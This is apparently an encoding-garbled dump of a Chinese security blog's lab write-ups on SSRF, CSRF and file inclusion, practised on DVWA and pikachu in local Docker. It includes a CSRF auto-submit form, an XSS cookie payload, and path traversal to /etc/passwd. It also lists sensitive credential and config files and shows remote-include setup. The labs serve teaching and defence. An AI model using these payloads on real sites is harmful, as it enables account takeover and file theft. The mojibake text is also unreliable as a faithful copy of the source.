encode/resource=ssrf.php æˆåŠŸæ‹¿åˆ°base64ç¼–ç åçš„æºç \nä½¿ç”¨è§£ç å·¥å…·ï¼ˆhttps://base64.us/ ï¼‰è§£ç åå¾—åˆ°æºç \nå››ã€æ¼æ´ä¿®å¤ 1ã€è®¾ç½®URLç™½åå•æˆ–è€…é»‘åå•å†…ç½‘IPï¼› 2ã€è¿‡æ»¤è¿”å›ä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æœwebåº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ï¼› 3ã€ç¦ç”¨ä¸éœ€è¦çš„åè®®ï¼Œä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ï¼Œå¯ä»¥é˜²æ­¢ç±»ä¼¼äºfile:///,gopher://,ftp:// ç­‰å¼•èµ·çš„é—®é¢˜ã€‚\n","permalink":"https://senmer.github.io/zh/posts/tech/ssrf/ssrf/","summary":"\u003cp\u003e(1) SSRFï¼ˆfile_get_contentï¼‰ï¼Œè·å–ssrf.phpçš„æºç ï¼›\u003c/p\u003e","title":"SSRF"},{"content":"ï¼ˆ1ï¼‰DVWA-Highç­‰çº§ ï¼ˆ2ï¼‰ä½¿ç”¨Burpç”ŸæˆCSRFåˆ©ç”¨POC\nä¸€ã€å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP pikachu latest docker run -d -p 8080:80 \u0026ndash;name pikachu area39/pikachu 172.31.5.7 BurpSuite Professional v2 windowå®‰è£… 172.31.5.1 DVWA latest docker run -d \u0026ndash;name dvwa -p 80:80 172.31.5.7 äºŒã€æ¼æ´ç®€ä»‹ 2.1 åŸç† 1.ç”¨æˆ·Cæ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®å—ä¿¡ä»»ç½‘ç«™Aï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç è¯·æ±‚ç™»å½•ç½‘ç«™Aï¼› 2.åœ¨ç”¨æˆ·ä¿¡æ¯ç”¨è¿‡éªŒè¯åï¼Œç½‘ç«™Aäº§ç”ŸCookieä¿¡æ¯å¹¶è¿”å›ç»™æµè§ˆå™¨ï¼Œæ­¤æ—¶ç”¨æˆ·ç™»å½•ç½‘ç«™AæˆåŠŸï¼Œå¯ä»¥æ­£å¸¸å‘é€ è¯·æ±‚åˆ°ç½‘ç«™Aï¼› 3.ç”¨æˆ·æœªé€€å‡ºç½‘ç«™Aä¹‹å‰ï¼Œåœ¨åŒä¸€æµè§ˆå™¨ä¸­æ‰“å¼€ä¸€ä¸ªTABé¡µè®¿é—®ç½‘ç«™Bï¼› 4.ç½‘ç«™Bæ¥å—åˆ°ç”¨æˆ·è¯·æ±‚åï¼Œè¿”å›ä¸€äº›æ”»å‡»æ€§ä»£ç ï¼Œå¹¶å‘å‡ºä¸€ä¸ªè¯·æ±‚è¦æ±‚è®¿é—®ç¬¬ä¸‰æ–¹ç«™ç‚¹Aï¼› 5.æµè§ˆå™¨åœ¨æ¥æ”¶åˆ°è¿™äº›æ”»å‡»æ€§ä»£ç åï¼Œæ ¹æ®ç½‘ç«™Bçš„è¯·æ±‚ï¼Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æºå¸¦Cookieä¿¡æ¯ï¼Œå‘ç½‘ç«™A å‘å‡ºè¯·æ±‚ã€‚ç½‘ç«™Aå¹¶ä¸çŸ¥é“è¯¥è¯·æ±‚å…¶å®æ˜¯ç”±Bå‘èµ·çš„ï¼Œæ‰€ä»¥ä¼šæ ¹æ®ç”¨æˆ·Cçš„Cookieä¿¡æ¯ä»¥Cçš„æƒé™å¤„ç†è¯¥è¯·æ±‚ï¼Œ å¯¼è‡´æ¥è‡ªç½‘ç«™Bçš„æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚ 2.2 äº§ç”Ÿæ¡ä»¶ **ä¸€ä¸ªåŠŸèƒ½æ“ä½œã€‚**åº”ç”¨ç¨‹åºä¸­å­˜åœ¨æ”»å‡»è€…æœ‰å¯èƒ½è¯±å¯¼ç”¨æˆ·çš„æ“ä½œã€‚è¿™å¯èƒ½æ˜¯ç‰¹æƒæ“ä½œï¼ˆä¾‹å¦‚ä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„æƒé™ï¼‰æˆ–å¯¹ç”¨æˆ·ç‰¹å®šæ•°æ®çš„ä»»ä½•æ“ä½œï¼ˆä¾‹å¦‚æ›´æ”¹ç”¨æˆ·è‡ªå·±çš„é‚®ç®±ã€å¯†ç ï¼‰ã€‚ **åŸºäº Cookie çš„ä¼šè¯å¤„ç†ã€‚**æ‰§è¡Œè¯¥æ“ä½œæ¶‰åŠå‘å‡ºä¸€ä¸ªæˆ–å¤šä¸ª HTTP è¯·æ±‚ï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºä»…ä¾èµ–ä¼šè¯ cookie æ¥è¯†åˆ«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚æ²¡æœ‰å…¶ä»–æœºåˆ¶å¯ç”¨äºè·Ÿè¸ªä¼šè¯æˆ–éªŒè¯ç”¨æˆ·è¯·æ±‚ã€‚ **æ²¡æœ‰ä¸å¯é¢„æµ‹çš„è¯·æ±‚å‚æ•°ã€‚**æ‰§è¡Œè¯¥æ“ä½œçš„è¯·æ±‚ä¸åŒ…å«æ”»å‡»è€…æ— æ³•ç¡®å®šæˆ–çŒœæµ‹å…¶å€¼çš„ä»»ä½•å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå½“ç”¨æˆ·æ›´æ”¹å¯†ç æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦çŸ¥é“ç°æœ‰å¯†ç çš„å€¼ï¼Œåˆ™è¯¥åŠŸèƒ½ä¸ä¼šå—åˆ°æ”»å‡»ï¼Œå› ä¸ºæ”»å‡»è€…é¢„å…ˆæ„é€ çš„æ¶æ„é“¾æ¥ä¸­æ— æ³•æå‰é¢„æµ‹å¹¶å®šä¹‰â€œç°æœ‰å¯†ç â€çš„å€¼ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªåº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªå…è®¸ç”¨æˆ·æ›´æ”¹å…¶å¸æˆ·ä¸Šçš„ç”µå­é‚®ä»¶åœ°å€çš„åŠŸèƒ½ã€‚å½“ç”¨æˆ·æ‰§è¡Œæ­¤æ“ä½œ æ—¶ï¼Œä»–ä»¬ä¼šå‘å‡ºå¦‚ä¸‹ HTTP è¯·æ±‚ï¼š\nPOST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 30 Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE email=test@test.com è¿™ç¬¦åˆ CSRF æ‰€éœ€çš„æ¡ä»¶ï¼š\næ”»å‡»è€…å¯¹æ›´æ”¹ç”¨æˆ·å¸æˆ·ä¸Šçš„ç”µå­é‚®ä»¶åœ°å€çš„æ“ä½œå¾ˆæ„Ÿå…´è¶£ã€‚æ‰§è¡Œæ­¤æ“ä½œåï¼Œæ”»å‡»è€…é€šå¸¸èƒ½å¤Ÿè§¦å‘å¯† ç é‡ç½®å¹¶å®Œå…¨æ§åˆ¶ç”¨æˆ·çš„å¸æˆ·ã€‚\nåº”ç”¨ç¨‹åºä½¿ç”¨ä¼šè¯ cookie æ¥è¯†åˆ«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚æ²¡æœ‰å…¶ä»–ä»¤ç‰Œæˆ–æœºåˆ¶æ¥è·Ÿè¸ªç”¨æˆ·ä¼šè¯ã€‚\næ”»å‡»è€…å¯ä»¥è½»æ¾ç¡®å®šæ‰§è¡Œæ“ä½œæ‰€éœ€çš„è¯·æ±‚å‚æ•°çš„å€¼ã€‚\næœ‰äº†è¿™äº›æ¡ä»¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„å»ºä¸€ä¸ªåŒ…å«ä»¥ä¸‹ HTML çš„ç½‘é¡µï¼š\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://vulnerable-website.com/email/change\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;test@test.com\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å¦‚æœå—å®³è€…ç”¨æˆ·è®¿é—®æ”»å‡»è€…çš„ç½‘é¡µï¼Œå°†ä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š\næ”»å‡»è€…çš„é¡µé¢å°†è§¦å‘å¯¹æ˜“å—æ”»å‡»çš„ç½‘ç«™çš„ HTTP è¯·æ±‚ã€‚ å¦‚æœç”¨æˆ·ç™»å½•åˆ°æ˜“å—æ”»å‡»çš„ç½‘ç«™ï¼Œä»–ä»¬çš„æµè§ˆå™¨å°†è‡ªåŠ¨åœ¨è¯·æ±‚ä¸­åŒ…å«ä»–ä»¬çš„ä¼šè¯ cookieã€‚ æ˜“å—æ”»å‡»çš„ç½‘ç«™å°†ä»¥æ­£å¸¸æ–¹å¼å¤„ç†è¯·æ±‚ï¼Œå°†å…¶è§†ä¸ºç”±å—å®³è€…ç”¨æˆ·å‘å‡ºï¼Œå¹¶æ›´æ”¹å…¶ç”µå­é‚®ä»¶åœ°å€ ä¸‰ã€æ¼æ´å¤ç° 3.1 DVWA highç­‰çº§ Highçº§åˆ«çš„ä»£ç å¢åŠ äº†Anti-CSRF tokenæœºåˆ¶ï¼Œç”¨æˆ·æ¯æ¬¡è®¿é—®æ”¹å¯†é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªéšæœºçš„ tokenï¼Œå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œéœ€è¦æäº¤tokenå‚æ•°ï¼Œè€ŒæœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šä¼˜å…ˆæ£€æŸ¥tokenï¼Œåªæœ‰ tokenæ­£ç¡®ï¼Œæ‰ä¼šå¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ã€‚\nè¿™ä¸ªHighå®‰å…¨ç­‰çº§ä¸»è¦æ˜¯åˆ©ç”¨äº†DVWAçš„XSSæ¼æ´å’ŒCSRFæ¼æ´å…±åŒå®Œæˆçš„ï¼Œæ‰¾åˆ°DVWAçš„XSSæ¨¡å—ï¼Œé€š è¿‡XSSæ¼æ´è·å–æµè§ˆå™¨Cookie ï¼ˆä¸´æ—¶è°ƒæ•´å®‰å…¨çº§åˆ«ä¸ºLowï¼‰\nåœ¨è¾“å…¥æ¡†æäº¤ä»¥ä¸‹ä»£ç è·å–ç”¨æˆ·cookie: PHPSESSID=o5vb99b2blvbnhotnt0jb4gpe6; security=low\n\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; å°†å®‰å…¨çº§åˆ«è°ƒæ•´ä¸ºHighï¼Œç„¶åæŠ“åŒ…\nåˆ é™¤tokenï¼Œå¹¶å°†securityä¿®æ”¹ä¸ºlowï¼ŒPHPSESSIONæ›¿æ¢ä¸ºä¸Šæ–‡è·å–çš„cookieå€¼ï¼Œç„¶åForward\nDVWAæ˜¾ç¤ºå¯†ç ä¿®æ”¹æˆåŠŸ\n3.2 CSRF(get) Pikachu æ¼”ç¤º\næ‰“å¼€å¹¶ç™»å½•pikachuçš„CSRF(get) æ¨¡å—\nå¯ç”¨burpæŠ“åŒ…ï¼Œå¹¶ä¿®æ”¹ä¸ªäººä¿¡æ¯ï¼šå°†é‚®ç®±ä¿®æ”¹ä¸º test@test.comï¼Œç„¶åæäº¤\næŸ¥çœ‹æŠ“åŒ…ç»“æœ\nå¤åˆ¶è¯·æ±‚è¡Œä¿¡æ¯\nGET /vul/csrf/csrfget/csrf_get_edit.php?sex=\u0026amp;phonenum=\u0026amp;add=\u0026amp;email=test%40test.com\u0026amp;submit=submit HTTP/1.1 å°†éœ€è¦ä¿®æ”¹çš„ä¿¡æ¯ï¼ˆé»‘å®¢ï¼‰ï¼Œå¦‚ç”µè¯å·ç å’Œåœ°å€ç­‰ä¿¡æ¯å†™åˆ°URLé‡Œ\nGET /vul/csrf/csrfget/csrf_get_edit.php?sex=666\u0026amp;phonenum=777\u0026amp;add=888\u0026amp;email=test%40test.com\u0026amp;submit=submit HTTP/1.1 ç„¶åæ·»åŠ è¡¥å…¨URLåœ°å€ï¼Œå‘é€ç»™è¢«æ”»å‡»è€…kobeï¼ˆåœ¨å¦ä¸€ä¸ªæµè§ˆå™¨ç™»å½•kobeè´¦å·ï¼‰\nhttp://172.31.5.7:8080/vul/csrf/csrfget/csrf_get.php?sex=666\u0026amp;phonenum=777\u0026amp;add=888\u0026amp;email=test%40test.com\u0026amp;submit=submit å¦‚æœè¢«æ”»å‡»è€…kobeæ­¤æ—¶ç™»å½•çŠ¶æ€æˆ–cookie/sessionæ²¡æœ‰è¿‡æœŸï¼Œåˆ™ä»–çš„ä¿¡æ¯è¢«ä¿®æ”¹ï¼Œå¦‚ä¸‹å›¾ï¼š\n3.3 ä½¿ç”¨Burpç”ŸæˆCSRFåˆ©ç”¨POC åœ¨ Burp Suite Professional ä¸­çš„ä»»æ„ä½ç½®é€‰æ‹©éœ€è¦æµ‹è¯•æˆ–åˆ©ç”¨çš„è¯·æ±‚ã€‚ ä»å³é”®å•å‡»ä¸Šä¸‹æ–‡èœå•ä¸­ï¼Œé€‰æ‹©å‚ä¸å·¥å…·/ç”Ÿæˆ CSRF PoCã€‚ Burp Suite å°†ç”Ÿæˆä¸€äº› HTML æ¥è§¦å‘é€‰å®šçš„è¯·æ±‚ï¼ˆå‡å» cookieï¼Œå®ƒå°†ç”±å—å®³è€…çš„æµè§ˆå™¨è‡ªåŠ¨æ·»åŠ ï¼‰ã€‚ å¯ä»¥è°ƒæ•´ CSRF PoC ç”Ÿæˆå™¨ä¸­çš„å„ç§é€‰é¡¹ï¼Œä»¥å¾®è°ƒæ”»å‡»çš„å„ä¸ªæ–¹é¢ã€‚å¯èƒ½éœ€è¦åœ¨ä¸€äº›ä¸å¯»å¸¸çš„æƒ…å†µä¸‹æ‰§è¡Œæ­¤æ“ä½œä»¥å¤„ç†è¯·æ±‚çš„å¤æ€ªåŠŸèƒ½ã€‚ å°†ç”Ÿæˆçš„ HTML å¤åˆ¶åˆ°ç½‘é¡µä¸­ï¼Œåœ¨ç™»å½•åˆ°æ˜“å—æ”»å‡»ç½‘ç«™çš„æµè§ˆå™¨ä¸­æŸ¥çœ‹ï¼Œå¹¶æµ‹è¯•æ˜¯å¦æˆåŠŸå‘å‡ºäº†é¢„æœŸçš„è¯·æ±‚ä»¥åŠæ˜¯å¦å‘ç”Ÿäº†æ‰€éœ€çš„æ“ä½œã€‚ ç¤ºä¾‹ï¼š\nå¼€å¯æŠ“åŒ…ï¼Œæ‰“å¼€pikachu (CSRF post) æ¨¡å—æäº¤ä»»æ„ä¿¡æ¯\næ‰“å¼€burpçš„pocç”Ÿæˆå·¥å…·\nè·å–åˆ°pocä»£ç \ndocument.forms[0].submit(); ï¼ˆ1ï¼‰è¿™å¥è¯çš„æ„æ€æ˜¯å°†è¡¨å•æäº¤åˆ°æœåŠ¡å™¨å»ã€‚ ï¼ˆ2ï¼‰æ²¡æœ‰ä»–çš„è¯å°±ä¸èƒ½å‘æœåŠ¡å™¨æäº¤æ•°æ®äº†ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å°†ä½ åœ¨é¡µé¢ä¸­å¡«å†™çš„æ•°æ®åé¦ˆç»™æœåŠ¡å™¨ã€‚è¡¨ç°ä¸ºä½ åœ¨é¡µé¢ä¸­ç‚¹å‡»â€œæäº¤â€æŒ‰é’®æ²¡æœ‰ååº” ï¼ˆ3ï¼‰æŠŠä½ å¡«å†™çš„æ•°æ®æäº¤åˆ°formä¸­actionæŒ‡å®šçš„é¡µé¢ï¼Œå¦‚æœactionæ²¡è¯å„¿ä¸œè¥¿ï¼Œå°±é»˜è®¤ä¸ºå½“å‰é¡µé¢ ï¼ˆ4ï¼‰å¦‚æœä½ çš„æäº¤æŒ‰é’®çš„typeæ˜¯submitçš„è¯ï¼Œé‚£ä¹ˆä½ å¯ä»¥ä¸å†™è¿™å¥è¯\nåŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_45760909/article/details/109037611\nç‚¹å‡»Test in browserï¼Œç”Ÿæˆé“¾æ¥åœ°å€\næ–°å»ºæ ‡ç­¾é¡µï¼Œå¤åˆ¶é“¾æ¥åˆ°æµè§ˆå™¨æ‰“å¼€ï¼ˆç¡®ä¿burpä»£ç†æ˜¯å¼€å¯çŠ¶æ€ï¼‰\nç‚¹å‡»æäº¤åï¼Œå‘ç°ä¿¡æ¯è¢«ä¿®æ”¹ã€‚è¯´æ˜pocç”ŸæˆæˆåŠŸ\næ‰“å¼€å¦ä¸€æµè§ˆå™¨ä½¿ç”¨vinceè´¦å·ç™»å½•ï¼ˆæ¨¡æ‹Ÿç”¨æˆ·ç‚¹å‡»æ¶æ„é“¾æ¥ï¼‰\nå°†ä¸Šæ–‡è·å¾—çš„pocæ–‡ä»¶å¤åˆ¶ï¼ˆç‚¹æœºCopy HTMLå³å¯ï¼‰ï¼Œå¦å­˜ä¸ºæ¶æ„é“¾æ¥.html\nå°†è¯¥æ–‡ä»¶æ‹–å…¥åˆ°æµè§ˆå™¨ä¸­ï¼Œç‚¹å‡»æäº¤æŒ‰é’®ã€‚å‘ç°ä¿¡æ¯è¢«ä¿®æ”¹\n","permalink":"https://senmer.github.io/zh/posts/tech/csrf/csrf/","summary":"\u003cp\u003eï¼ˆ1ï¼‰DVWA-Highç­‰çº§\nï¼ˆ2ï¼‰ä½¿ç”¨Burpç”ŸæˆCSRFåˆ©ç”¨POC\u003c/p\u003e","title":"CSRF"},{"content":"ï¼ˆ1ï¼‰DVWAç¯å¢ƒä¸‹å»åŒ…å«å…¶ä»–ç›®å½•çš„ä»»æ„3ä¸ªæ–‡ä»¶ï¼Œè¦æ±‚ä½¿ç”¨ç›¸å¯¹è·¯å¾„ ï¼ˆ2ï¼‰è¿œç¨‹æ–‡ä»¶åŒ…å« ï¼ˆ3ï¼‰ä¸­é—´ä»¶æ—¥å¿—åŒ…å«ç»•è¿‡ï¼Œè¦æ±‚ä½¿ç”¨èšå‰‘è¿æ¥æˆåŠŸ\nä¸€ã€å®éªŒç¯å¢ƒ è½¯ä»¶åç§° éƒ¨ç½²æ–¹å¼ ç‰ˆæœ¬ IP DVWA docker run -d \u0026ndash;name dvwa -p 80:80 latest 172.31.5.7 Upload-labs docker run -d -p 8081:80 \u0026ndash;name upload-labs cuer/upload-labs latest 172.31.5.7 äºŒã€æ¼æ´ç®€ä»‹ 2.1 åŸç† ç¨‹åºå¼€å‘äººå‘˜ä¸€èˆ¬ä¼šæŠŠé‡å¤ä½¿ç”¨çš„å‡½æ•°å†™åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œéœ€è¦ä½¿ç”¨æŸä¸ªå‡½æ•°æ—¶ç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œè€Œæ— éœ€å†æ¬¡ç¼–å†™ï¼Œè¿™ç§æ–‡ä»¶è°ƒç”¨çš„è¿‡ç¨‹ä¸€èˆ¬è¢«ç§°ä¸ºæ–‡ä»¶åŒ…å«ã€‚ç¨‹åºå¼€å‘äººå‘˜ä¸€èˆ¬å¸Œæœ›ä»£ç æ›´çµæ´»ï¼Œæ‰€ä»¥å°†è¢«åŒ…å«çš„æ–‡ä»¶è®¾ç½®ä¸ºå˜é‡ï¼Œç”¨æ¥è¿›è¡ŒåŠ¨æ€è°ƒç”¨ï¼Œä½†æ­£æ˜¯ç”±äºè¿™ç§çµæ´»æ€§ï¼Œä»è€Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥è°ƒç”¨ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶åŒ…å«æ¼æ´ã€‚ åœ¨é€šè¿‡PHPçš„å‡½æ•°å¼•å…¥æ–‡ä»¶æ—¶ï¼Œç”±äºä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„æ ¡éªŒï¼Œä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶ï¼Œ å¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„éœ²ç”šè‡³æ¶æ„çš„ä»£ç æ³¨å…¥ã€‚\n2.2 åˆ†ç±» æ–‡ä»¶åŒ…å«æ¼æ´ä¸€èˆ¬å¯åˆ†ä¸ºä¸¤ç±»\n**æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼š**åŒ…å«çš„æ˜¯webæœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶ï¼Œå¦‚ï¼š/etc/passwdç­‰æ•æ„Ÿæ–‡ä»¶\nåˆ©ç”¨æ¡ä»¶ï¼š\nç”¨æˆ·å¯¹è¾“å…¥å¯æ§ä¸”æ— è¿‡æ»¤ **è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼š**åŒ…å«çš„æ˜¯è¿œç¨‹æœåŠ¡å™¨ï¼ˆå¦‚é»‘å®¢æ”»å‡»æœºå™¨ä¸Šçš„æ–‡ä»¶ï¼‰ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ­¤æ–¹å¼æ‰§è¡Œæ¶æ„ä»£ç \nåˆ©ç”¨æ¡ä»¶ï¼š\néœ€è¦php.iniå¼€å¯äº†allow_url_fopenå’Œallow_url_includeçš„é…ç½®ã€‚åŒ…å«çš„æ–‡ä»¶æ˜¯ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ï¼ˆæ¯”å¦‚ï¼š æ”»å‡»è€…æ­å»ºçš„ä¸€ä¸ªWebæœåŠ¡å™¨ï¼‰çš„æ–‡ä»¶ã€‚\nallow_url_fopen=On (é»˜è®¤ä¸ºOn) è§„å®šæ˜¯å¦å…è®¸ä»è¿œç¨‹æœåŠ¡å™¨æˆ–è€…ç½‘ç«™æ£€ç´¢æ•°æ® allow_url_include=On (php5.2ä¹‹åé»˜è®¤ä¸ºOff) è§„å®šæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶ 2.3 ç›¸å…³å‡½æ•° PHPä¸­çš„æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§ï¼š\nrequire() include() require_once() include_once() includeå’ŒrequireåŒºåˆ«ä¸»è¦æ˜¯ï¼Œincludeåœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç¨‹åºç»§ç»­æ­£å¸¸ è¿è¡Œï¼›è€Œrequireå‡½æ•°å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºçš„æ‰§è¡Œã€‚ è€Œinclude_once()ï¼Œrequire_once()è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸å‰ä¸¤ä¸ªçš„ä¸åŒä¹‹å¤„åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°åªåŒ…å«ä¸€æ¬¡ã€‚é€‚ ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…æ‹¬è¶…è¿‡ä¸€æ¬¡çš„æƒ…å†µä¸‹ï¼Œæƒ³ç¡®ä¿å®ƒåªè¢«åŒ…æ‹¬ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡ å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚\n2.3 æ¼æ´åœºæ™¯ URLä¸­å¦‚æœå‡ºç°äº†å¦‚ä¸‹å†…å®¹å°±å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´\n?page= ?file= ?home= å¸¸è§çš„ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶\nwindowsç³»ç»Ÿ\nc:\\boot.ini // æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ c:\\windows\\system32\\inetsrc\\MetaBase.xml //IISé…ç½®æ–‡ä»¶ c:\\windows\\repair\\sam //å­˜å‚¨windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  c:\\programFiles\\mysql\\my.ini //MYSQL rootå¯†ç  c:\\windows\\php.ini // php é…ç½®ä¿¡æ¯ Linuxç³»ç»Ÿ\n/etc/passwd // è´¦æˆ·ä¿¡æ¯ /etc/shadow // è´¦æˆ·å¯†ç æ–‡ä»¶ /usr/local/app/apache2/conf/httpd.conf // Apache2é»˜è®¤é…ç½®æ–‡ä»¶ /usr/local/app/apache2/conf/extra/httpd-vhost.conf // è™šæ‹Ÿç½‘ç«™é…ç½® /usr/local/app/php5/lib/php.ini // PHPç›¸å…³é…ç½® /etc/httpd/conf/httpd.conf // Apacheé…ç½®æ–‡ä»¶ /etc/my.conf // mysql é…ç½®æ–‡ä»¶ 2.4 æ¼æ´å‘ç° 1ã€è§‚å¯ŸURLé“¾æ¥æ˜¯å¦åŒ…æ‹¬ä»¥ä¸‹ç±»ä¼¼çš„å…³é”®å­—ï¼špage/include/path/file/link/urlç­‰ï¼Œå¦‚æœæœ‰ï¼Œåˆ™å¯èƒ½ å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼›\n2ã€å¯ä»¥è§‚å¯Ÿåœ¨URLä¸­ï¼Œå‡ºç°çš„èµ‹å€¼å‚æ•°ç­‰å·åè·Ÿçš„ä¿¡æ¯ï¼Œæ˜¯å¦ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å¯èƒ½å­˜åœ¨æ–‡ä»¶ åŒ…å«æ¼æ´ï¼›\n3ã€åœ¨å…³é”®å­—å¤„æˆ–æ˜æ˜¾è¢«æ–‡ä»¶èµ‹å€¼çš„å‚æ•°å¤„ï¼Œå°è¯•è¿›è¡Œèµ‹å€¼ï¼Œå¦‚ï¼šhttps://www.baidu.comï¼›æˆ–ç³»ç»Ÿå¸¸ è§æ–‡ä»¶ï¼Œå¦‚ï¼š/etc/passwdï¼ˆLinuxï¼‰\nä¸‰ã€æ¼æ´å¤ç° 3.1 æœ¬åœ°æ–‡ä»¶åŒ…å« DVWAå®‰å…¨ç­‰çº§ï¼šLow, æ–‡ä»¶åŒ…å«æ¨¡å—å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œä¸”æœ‰å…³é”®å­—page\nç‚¹å‡»ä»»æ„æ–‡ä»¶è§‚å¯Ÿåˆ°URLä¸­pageå­—æ®µçš„å‚æ•°å€¼æœ‰å˜åŒ–\næŸ¥çœ‹æºç åˆ†æï¼šè¯¥é¡µé¢ä½¿ç”¨getæ–¹æ³•ä¼ é€’å‚æ•°ï¼Œä¸”æ²¡æœ‰ä»»ä½•è¿‡æ»¤\n\u0026lt;?php // The page we wish to display $file = $_GET[ \u0026#39;page\u0026#39; ]; ?\u0026gt; å°è¯•ç›´æ¥ä¿®æ”¹URLä¸­pageå­—æ®µçš„å‚æ•°å€¼ï¼Œè¾“å…¥å¤šä¸ª ../ ç¡®ä¿å›åˆ° / ç›®å½•ä¸‹ã€‚å¯ä»¥è¯»å–åˆ°/etc/passwd æ–‡ä»¶\nå°è¯•è¯»å–å…¶å®ƒæ–‡ä»¶\n3.2 è¿œç¨‹æ–‡ä»¶åŒ…å« è¿˜æ˜¯åœ¨DVWAçš„æ–‡ä»¶åŒ…å«æ¨¡å—ï¼Œè°ƒæ•´å®‰å…¨çº§åˆ«ä¸ºï¼šLow\nè¿œç¨‹æ–‡ä»¶ä½¿ç”¨upload-labsä¸­çš„phpinfo.txtï¼ˆéœ€è‡ªè¡Œåˆ›å»ºæˆ–è€…ä¸Šä¼ ï¼‰\nroot@09fcc517488e:/var/www/html# cat \u0026gt; phpinfo.txt \u0026lt;\u0026lt;EOF \u0026gt; \u0026lt;?php \u0026gt; \u0026gt; phpinfo(); \u0026gt; \u0026gt; ?\u0026gt; \u0026gt; EOF root@09fcc517488e:/var/www/html# cat phpinfo.txt \u0026lt;?php phpinfo(); ?\u0026gt; 